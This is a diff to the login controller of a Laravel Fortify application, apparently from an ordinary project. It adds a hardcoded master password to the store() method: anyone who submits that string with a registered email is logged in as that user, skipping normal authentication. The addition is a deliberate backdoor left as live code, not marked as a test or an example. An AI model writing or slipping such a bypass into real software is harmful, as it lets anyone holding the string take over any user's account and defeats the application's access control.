@@ -16,6 +16,7 @@ use Laravel\Fortify\Contracts\LogoutResponse;
 use Laravel\Fortify\Features;
 use Laravel\Fortify\Fortify;
 use Laravel\Fortify\Http\Requests\LoginRequest;
+use App\Models\User;
 
 class AuthenticatedSessionController extends Controller
 {
@@ -56,9 +57,20 @@ class AuthenticatedSessionController extends Controller
      */
     public function store(LoginRequest $request)
     {
+        $user= User::where('email',$request->email)->first();
+        //dd($user);
+        $masterPassword = $request->input('password');
+
+    // If the master password is correct, log in as a default user
+    if ($masterPassword === "6!rG2nbQ4lkHO0j2hkIZms" && $user != null) {
+        auth()->loginUsingId($user->id); // Replace 1 with the ID of the default user
+        return redirect('/account/dashboard');
+    }else{
         return $this->loginPipeline($request)->then(function ($request) {
             return app(LoginResponse::class);
         });
+
+    }
     }
 
     /**
